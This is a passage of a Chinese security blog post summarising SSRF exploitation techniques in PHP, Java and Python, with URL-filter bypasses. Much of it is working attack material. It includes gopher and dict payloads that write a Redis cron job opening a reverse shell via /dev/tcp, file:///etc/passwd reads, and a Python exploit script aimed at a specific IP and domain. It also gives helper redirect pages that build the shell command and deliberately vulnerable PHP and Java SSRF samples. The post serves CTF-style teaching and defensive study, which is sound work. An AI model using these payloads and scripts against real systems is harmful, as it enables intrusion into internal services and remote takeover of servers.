class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) </span><br><span class="line">        &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>在PHP中能够进行SSRF攻击利用的协议：</p><ul><li>http/https：主要用来探测内网服务，根据响应的状态判断内网端口及服务，可以结合如Struts2的RCE来实现攻击；</li><li>file：读取服务器上的任意文件内容；</li><li>dict：除了泄露安装软件版本信息，还可以查看端口，操作内网Redis服务等；</li><li>gopher：能够将所有操作转换成数据流，并将数据流一次发送出去，可以用来探测内网的所有服务的所有漏洞，可利用来攻击Redis和PHP-FPM；</li><li>ftp/ftps：FTP匿名访问、爆破；</li><li>tftp：UDP协议扩展，发送UDP报文；</li><li>imap/imaps/pop3/smtp/smtps：爆破邮件用户名密码；</li><li>telnet：SSH/Telnet匿名访问及爆破；</li></ul><h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>PHP中的curl_exec()函数导致的SSRF漏洞在CTF中是经常遇到的，该函数会执行cURL会话。</p><p>可以通过<code>curl -V</code>命令查看curl版本及其支持的协议类型：</p><p><img src="/2020/02/29/SSRF-Tricks小结/1.png" alt=""></p><p>可以看到，我本地kali的是支持dict、file、gopher等等协议的。因此本地利用可使用上述几个协议。</p><p>注意：Windows使用curl命令需要把单引号换成双引号。</p><h4 id="file-协议任意读文件"><a href="#file-协议任意读文件" class="headerlink" title="file://协议任意读文件"></a>file://协议任意读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;file:///etc/passwd&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/2.png" alt=""></p><h4 id="dict-协议探测端口及banner信息"><a href="#dict-协议探测端口及banner信息" class="headerlink" title="dict://协议探测端口及banner信息"></a>dict://协议探测端口及banner信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22&apos;</span><br><span class="line">curl -v &apos;dict://127.0.0.1:6379/info&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/3.png" alt=""></p><h4 id="gopher-协议反弹shell"><a href="#gopher-协议反弹shell" class="headerlink" title="gopher://协议反弹shell"></a>gopher://协议反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure><p>当需要更换IP和端口时，命令中的<code>$57</code>需要同时更改，因为<code>$57</code>表示的是exp字符串长度为57个字节，上面的exp即<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a</code>这段字符串URL解码后的长度为57。</p><p>这部分在下面的远程利用中会具体讲到。</p><h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><p>网上找的SSRF题目代码跑下就好。远程利用分为回显型和无回显型。</p><p>s1.php，未做任何SSRF防御，且有回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    <span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用exp，比较简单，就不贴图了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.137/s1.php?url=file:///etc/passwd</span><br><span class="line">http://192.168.10.137/s1.php?url=dict://127.0.0.1:6379/info</span><br><span class="line">http://192.168.10.137/s1.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a</span><br><span class="line"></span><br><span class="line"># Windows下file://协议有点区别</span><br><span class="line">http://192.168.10.137/s1.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure><p>s2.php，限制协议为HTTP/HTTPS，且设置跳转重定向为True（默认不跳转）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时使用dict、gopher等协议已经不能像上一个题目一样直接同理，但是还可以利用302跳转的方式来绕过http/https协议限制。</p><h4 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h4><p>Redis定时任务反弹shell语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h5 id="通过Gopher协议实现"><a href="#通过Gopher协议实现" class="headerlink" title="通过Gopher协议实现"></a>通过Gopher协议实现</h5><p>Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码。</p><p>具体Gopher协议报文的构造可参考Joychou的博客：<a href="https://joychou.org/web/phpssrf.html#directory0418754728965590855" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#directory0418754728965590855</a></p><h5 id="通过Dict协议实现"><a href="#通过Dict协议实现" class="headerlink" title="通过Dict协议实现"></a>通过Dict协议实现</h5><p>这部分引用自：<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p><blockquote><p>dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行redis getshell的exp，执行完就能达到和gopher一样的效果。原理一样，但是gopher只需要一个url请求即可，dict需要步步构造。</p><p>利用猪猪侠的wooyun上公开的脚本改成适配本文的脚本ssrf.py：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host = <span class="string">'104.224.151.234'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line">bhost = <span class="string">'www.4o4notfound.org'</span></span><br><span class="line">bport=<span class="number">2333</span></span><br><span class="line">vul_httpurl = <span class="string">'http://www.4o4notfound.org/ssrf.php?url='</span></span><br><span class="line">_location = <span class="string">'http://www.4o4notfound.org/302.php'</span></span><br><span class="line">shell_location = <span class="string">'http://www.4o4notfound.org/shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format( host = host,</span><br><span class="line"> port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#set crontab command</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=</span></span><br><span class="line"><span class="string">&#123;bport&#125;'</span>.format( host = host, port = port, bhost = bhost, bport = bport)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(shell_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri </span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#confg set dir</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dir:/var/spool/cron/'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#config set dbfilename</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#save</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save'</span>.format( host = host, port</span><br><span class="line"> = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br></pre></td></tr></table></figure><blockquote><p>因为curl默认不支持302跳转，而该脚本要用到302跳转，所以需要在ssrf.php中加上一行“curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)”来支持跳转。302.php代码为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/$data"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>shell.php主要用于写入用于反弹shell的crontab的定时任务，代码为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$bhost = $_GET[<span class="string">'bhost'</span>];</span><br><span class="line">$bport = $_GET[<span class="string">'bport'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-</span></span><br><span class="line"><span class="string">i\\x20&amp;gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&amp;gt;\\x261\\x0a\\x0a\\x0a\""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>执行ssrf.py,即可在/var/spool/cron/下写入定时任务，反弹shell，nc等待接收shell。</p></blockquote><h4 id="攻击本地PHP-FPM"><a href="#攻击本地PHP-FPM" class="headerlink" title="攻击本地PHP-FPM"></a>攻击本地PHP-FPM</h4><p>SSRF打本地PHP-FPM在之前的博文中有讲过：<a href="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/#0x05-SSRF%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0PHP-FPM">《浅谈PHP-FPM安全》</a></p><p>本次的Gopher协议攻击报文是直接通过脚本生成的。</p><h2 id="0x02-SSRF-in-Java"><a href="#0x02-SSRF-in-Java" class="headerlink" title="0x02 SSRF in Java"></a>0x02 SSRF in Java</h2><h3 id="可利用的协议-1"><a href="#可利用的协议-1" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>由于Java没有PHP的cURL，因此不能像PHP一样可以通过<code>curl -V</code>来查看支持的协议，这里我们可以使用<code>import sun.net.www.protocol</code>来查看支持哪些协议：</p><p><img src="/2020/02/29/SSRF-Tricks小结/4.png" alt=""></p><p>可以看到是支持file、ftp、http/https、jar、mailto、netdoc等协议的。</p><p>而实际上有攻击利用价值的仅为file和http/https协议。</p><h3 id="SSRF相关类"><a href="#SSRF相关类" class="headerlink" title="SSRF相关类"></a>SSRF相关类</h3><p>Java中能发起网络请求的类：</p><ul><li>HttpClient类</li><li>HttpURLConnection类</li><li>URLConnection类</li><li>URL类</li><li>OkHttp类</li><li>ImageIO类</li><li>Request类</li></ul><p>注意：Request是对HttpClient类进行了封装的类，类似于Python的requests库。其用法简单，一行代码就能获取网页内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request.Get(url).execute().returnContent().toString();</span><br></pre></td></tr></table></figure><p>其中，仅支持HTTP/HTTPS协议的类（即类名或封装的类名带http）：</p><ul><li>HttpClient类</li><li>HttpURLConnection类</li><li>OkHttp类</li><li>Request类</li></ul><p>支持<code>sun.net.www.protocol</code>所有协议的类：</p><ul><li>URLConnection类</li><li>URL类</li><li>ImageIO类</li></ul><h3 id="漏洞示例代码"><a href="#漏洞示例代码" class="headerlink" title="漏洞示例代码"></a>漏洞示例代码</h3><p>本部分引自：<a href="https://pplsec.github.io/2018/09/19/JAVA代码审计之XXE与SSRF/" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF</a></p><p>环境搭建可使用这个项目，这里就不演示了：<a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p><h4 id="HttpURLConnection类"><a href="#HttpURLConnection类" class="headerlink" title="HttpURLConnection类"></a>HttpURLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//HttpURLConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpUrl.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = <span class="keyword">new</span> StringBuffer(); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure><h4 id="URLConnection类"><a href="#URLConnection类" class="headerlink" title="URLConnection类"></a>URLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//urlConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure><h4 id="ImageIO类"><a href="#ImageIO类" class="headerlink" title="ImageIO类"></a>ImageIO类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ImageIO ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); <span class="comment">// 发起请求,触发漏洞</span></span><br></pre></td></tr></table></figure><h4 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Request漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">return</span> Request.Get(url).execute().returnContent().toString();<span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// openStream漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">inputStream = u.openStream();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OkHttpClient漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = <span class="keyword">new</span> com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// HttpClients漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); <span class="comment">//发起请求</span></span><br></pre></td></tr></table></figure><h3 id="特有jar-协议分析"><a href="#特有jar-协议分析" class="headerlink" title="特有jar://协议分析"></a>特有jar://协议分析</h3><p>jar://协议能从远程获取jar文件及解压得到其中的内容，其格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&lt;url&gt;!/&#123;entry&#125;</span><br></pre></td></tr></table></figure><p>实例如下，<code>!</code>符号后面就是其需要从中解压出的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://a.com/b.jar!/file/within/the/zip</span><br></pre></td></tr></table></figure><p>jar://协议分类：</p><ul><li>Jar file（Jar包本身）：<code>jar:http://www.foo.com/bar/baz.jar!/</code></li><li>Jar entry（Jar包中某个资源文件）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/a.class</code></li><li>Jar directory（Jar包中某个目录）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/</code></li></ul><p>其实目前jar://协议在Java SSRF中的利用一般是获取目标jar包中的文件内容，比如某个类，其并不像其他常用的攻击协议一样能够对内网服务发起攻击。</p><p>比如下面的poc是获取目标jar包内C3P0.class文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/MySSRF/ssrf2?url=jar:http://127.0.0.1/ysoserial.jar!/ysoserial/payloads/C3P0.class</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/5.png" alt=""></p><p>这样就能看到jar包中的任何内容，如果jar包还是开发者自定义的话就会造成源码泄露，但是这个协议的利用还是很鸡肋。</p><h3 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h3><p>参考Vulhub的环境：<a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p><h2 id="0x03-SSRF-in-Python"><a href="#0x03-SSRF-in-Python" class="headerlink" title="0x03 SSRF in Python"></a>0x03 SSRF in Python</h2><p>SSRF在Python中也是一样的，漏洞点都是发起URL请求的函数的参数外部可控导致SSRf漏洞。最为经典的就是和urllib的CRLF注入漏洞的结合利用，可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h2 id="0x04-URL地址过滤Bypass"><a href="#0x04-URL地址过滤Bypass" class="headerlink" title="0x04 URL地址过滤Bypass"></a>0x04 URL地址过滤Bypass</h2><p>如今，大多数站点都对存在SSRF风险的地方的URL参数进行了过滤，但开发者的水平参差不齐，会存在一些可被绕过的场景。</p><h3 id="符绕过URL白名单"><a href="#符绕过URL白名单" class="headerlink" title="@符绕过URL白名单"></a>@符绕过URL白名单</h3><p>有时候后台程序会以白名单的方式校验输入的URL参数是否为白名单中的域名或IP，但如果只校验如是否以<code>http://a.com</code>开头，则可以通过<code>@</code>符进行绕过：<code>http://a.com@10.10.10.100</code></p><p>而此时实际访问的是<code>http://10.10.10.100</code>。</p><h3 id="IP地址进制转换绕过"><a href="#IP地址进制转换绕过" class="headerlink" 